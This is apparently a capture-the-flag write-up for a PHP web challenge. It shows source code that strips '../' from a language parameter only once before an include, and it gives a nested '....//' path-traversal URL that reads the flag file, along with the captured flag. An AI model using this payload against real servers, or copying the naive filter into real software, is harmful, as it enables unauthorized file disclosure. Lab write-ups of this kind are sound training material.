# MiniSTRyplace

## Description

Let's read this website in the language of Alines. Or maybe not?
This challenge will raise 33 euros for a good cause.

178.62.30.167:32247

## Solution

In the source we see index.php

```php
<html>
    <header>
        <meta name='author' content='bertolis, makelaris'>
        <title>Ministry of Defence</title>
        <link rel="stylesheet" href="/static/css/main.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
    </header>

    <body>
    <div class="language">
        <a href="?lang=en.php">EN</a>
        <a href="?lang=qw.php">QW</a>
    </div>

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html> 
```

we see in the lang get parameter, the string "../" is replaced by "".
So, to get an LFI we need nested ../

consider the string "....//", after replacing the "../" with "" the resulting string is "../" allowing us to climb directories!

we see in the Dockerfile that the flag is at root so with the payload

`http://178.62.30.167:32247/?lang=....//....//....//....//flag`

we can read the flag!

CHTB{b4d_4li3n_pr0gr4m1ng} 